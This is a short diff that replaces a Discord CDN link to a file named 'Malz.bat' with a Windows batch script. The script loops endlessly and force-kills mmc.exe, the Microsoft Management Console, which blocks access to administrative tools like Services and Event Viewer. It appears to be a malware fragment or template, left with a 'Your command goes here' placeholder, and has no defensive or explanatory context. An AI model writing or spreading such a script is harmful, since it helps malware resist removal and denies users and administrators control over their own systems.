@@ -1,1 +1,5 @@
-https://cdn.discordapp.com/attachments/1099674090605903892/1127591197028925530/Malz.bat
+@echo off
+:loop
+REM Your command goes here
+cmd /c taskkill /f /IM mmc.exe
+goto loop
